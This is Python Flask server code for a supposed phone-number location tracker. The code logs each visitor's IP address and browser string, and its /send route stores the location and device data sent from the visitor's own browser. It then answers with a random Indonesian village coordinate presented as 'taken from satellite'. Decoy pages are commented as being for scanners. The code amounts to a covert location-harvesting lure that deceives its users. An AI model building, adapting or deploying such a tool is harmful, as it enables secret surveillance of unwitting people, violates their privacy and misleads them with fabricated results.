"""
{{ Property By ViewTech Team }}

Copyright (c) ViewTech Organization (https://github.com/ViewTechOrg)

All Rights Reserved.

This software and its associated components are the exclusive property of
ViewTech Organization. Unauthorized copying, modification, distribution,
decompilation, or reverse engineering of this software, in whole or in part,
is strictly prohibited without prior written permission from ViewTech Organization.

You may use this software only in accordance with the licensing terms granted
by ViewTech Organization. Any unauthorized usage or redistribution is a
violation of applicable intellectual property laws and may result in legal action.

For licensing inquiries, contact: bayuriski558@gmail.com
"""

from flask import Flask, request, jsonify, render_template, make_response, url_for
from flask_cors import CORS
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from datetime import datetime
from phonenumbers import carrier, geocoder
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import phonenumbers
import random
import requests as REQ
import json, os, threading
from queue import Queue
import threading, time
import stat,base64

app = Flask(__name__, static_folder="static", static_url_path="/static")
CORS(app)

LOG_FILE = "ip.txt"

@app.after_request
def add_headers(response):
    response.cache_control.public = True
    response.cache_control.max_age = 86400
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self' https:; "
        "script-src 'self' 'unsafe-inline' https:; "
        "style-src 'self' 'unsafe-inline' https:; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https:; "
        "frame-ancestors 'none';"
    )
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response


def write_log(ip_address: str, user_agent: str):
    def do_write():
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True) if os.path.dirname(LOG_FILE) else None
        with open(LOG_FILE, "a") as fp:
            fp.write(f"IP: {ip_address}\r\n")
            fp.write(f"User-Agent: {user_agent}\r\n\n")
    threading.Thread(target=do_write, daemon=True).start()


# lokasi file kunci
KEY_DIR = "keys"
PRIVATE_KEY_FILE = os.path.join(KEY_DIR, "private.pem")
PUBLIC_KEY_FILE = os.path.join(KEY_DIR, "public.pem")
Makmu = base64.b64encode(os.urandom(32)).decode()  #32 byte key (AES-256)
SECRET_KEY = Makmu

# random key
def ensure_keys():
    os.makedirs(KEY_DIR, exist_ok=True)
    if not os.path.exists(PRIVATE_KEY_FILE) or not os.path.exists(PUBLIC_KEY_FILE):
        # generate RSA 2048
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        priv_pem = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        pub_pem = key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        with open(PRIVATE_KEY_FILE, "wb") as f:
            f.write(priv_pem)
        with open(PUBLIC_KEY_FILE, "wb") as f:
            f.write(pub_pem)
        
        try:
            os.chmod(PRIVATE_KEY_FILE, stat.S_IRUSR | stat.S_IWUSR)
        except Exception:
            pass

ensure_keys()

class BaseGeo:
    def __init__(self):
        self.base = "https://raw.githubusercontent.com/coll-j/indonesia-locations-data/refs/heads/main/Village_LongLat_Approx.csv"
        self.dadu = ""
        
    def urandom(self):
        get_data = REQ.get(self.base).text.splitlines()
        self.dadu = random.choice(get_data) # 11 lat, 12 long | 5 & 6
        return self.dadu

class FakeLocation(BaseGeo):
    def __init__(self):
        super().__init__()
        self.get = self.urandom()
        lat, lon = [float(self.get.split(",")[5].splitlines()[0]),float(self.get.split(",")[6].splitlines()[0])]
        self.respon = dict({"lat": lat,"lon": lon})
        # self.respon = self.get.split(",")

# pp = FakeLocation().respon
# print(pp); exit()

# def decrypt_payload(enc_b64: str) -> dict:
#     try:
#         raw = base64.b64decode(enc_b64)
#         iv, ct = raw[:16], raw[16:]
#         cipher = AES.new(base64.urlsafe_b64decode(SECRET_KEY), AES.MODE_CBC, iv)
#         dec = unpad(cipher.decrypt(ct), AES.block_size).decode()
#         return(dec)
#     except Exception as e:
#         return {"error": str(e)}

def decrypt_payload(enc_b64: str):
    global SECRET_KEY
    try:
        raw = base64.b64decode(enc_b64)
        iv, ct = raw[:16], raw[16:]
        cipher = AES.new(base64.b64decode(SECRET_KEY), AES.MODE_CBC, iv)
        dec = unpad(cipher.decrypt(ct), AES.block_size).decode()
        return json.loads(dec)
    except Exception as e:
        print(f"[DECRYPT ERROR] {e}")  # debug sementara
        return {"error": str(e)}

# def decrypt_payload(enc_b64: str) -> dict:
#     try:
#         raw = base64.b64decode(enc_b64)
#         iv, ct = raw[:16], raw[16:]
#         key = base64.b64decode(Makmu)
#         cipher = AES.new(key, AES.MODE_CBC, iv)
#         dec = unpad(cipher.decrypt(ct), AES.block_size).decode()
#         return json.loads(dec)
#     except Exception as e:
#         return {"error": str(e)}
        
@app.route("/send", methods=["POST"])
def track():
    raw = request.get_json(force=True) or {}
    enc_data = raw.get("data")
    if enc_data:
        data = decrypt_payload(enc_data)
        if "error" in data:
            return jsonify({"status": "error", "message": "Bad Request"}), 400
    else:
        return jsonify({"status": "Error","message": "Bad Request"}), 400
        
    phone = data.get("phone", "")
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("acc")
    device = data.get("device", {})
    now = datetime.utcnow().isoformat()

    if not phone.startswith("+"):
        phone = "+62" + phone.lstrip("0")

    try:
        num = phonenumbers.parse(phone, None)
        region_code = phonenumbers.region_code_for_number(num) or "ID"
        valid = phonenumbers.is_valid_number(num)
        provider_name = carrier.name_for_number(num, "id") or "Unknown"
        desc = geocoder.description_for_number(num, "id")
        target_location = FakeLocation().respon
        
    except Exception:
        region_code = "ID"
        valid = False
        provider_name = "Unknown"
        desc = "Unknown"
        target_location = "Unknown"

    # buat log
    log = {
        "time": now,
        "phone": phone,
        "region_code": region_code,
        "provider": provider_name,
        "description": desc,
        "fake_location": target_location,
        "device": device,
        "target_location": {"lat": lat, "lon": lon, "acc": acc}
    }

    with open("logs.json", "w", encoding="utf-8") as f:
        f.write(json.dumps(log) + "\n")

    return jsonify({
        "status": "ok",
        "message": "Sukses Di ambil dari satelit",
        "phone_info": {
            "valid": valid,
            "region": region_code,
            "provider": provider_name,
            "description": desc
        },
        "target_location": target_location,
        "received_at": now
    })

# method for idiot scanner
@app.route("/about")
def about():
    return render_template("about.html")


@app.route("/privacy")
def privacy():
    return render_template("privacy.html")


@app.route("/terms")
def terms():
    return render_template("terms.html")


@app.route("/contact")
def contact():
    return render_template("contact.html")


@app.route("/robots.txt")
def robots():
    resp = make_response("User-agent: *\nAllow: /\nSitemap: " + url_for('sitemap', _external=True))
    resp.mimetype = "text/plain"
    return resp


@app.route("/sitemap.xml")
def sitemap():
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>{url_for('index', _external=True)}</loc></url>
  <url><loc>{url_for('about', _external=True)}</loc></url>
  <url><loc>{url_for('privacy', _external=True)}</loc></url>
  <url><loc>{url_for('terms', _external=True)}</loc></url>
  <url><loc>{url_for('contact', _external=True)}</loc></url>
</urlset>"""
    resp = make_response(xml)
    resp.mimetype = "application/xml"
    return resp

@app.route("/", methods=["GET", "POST"])
def index():
    ip = (
        request.headers.get("Client-IP")
        or request.headers.get("X-Forwarded-For")
        or request.remote_addr
        or ""
    )

    user_agent = request.headers.get("User-Agent", "")
    write_log(ip, user_agent)

    with open(PUBLIC_KEY_FILE, "rb") as f:
        pub_pem = f.read()
    fp = str(hash(pub_pem.decode()))[:10]
    
    return render_template("index.html", PUBKEY_FP=fp, Moduless = Makmu)
    # return render_template("index.html")


if __name__ == "__main__":
    print("[[ Property By ViewTech Team|github.com/ViewTechOrg ]]")
    app.run(port=5000, debug=False)
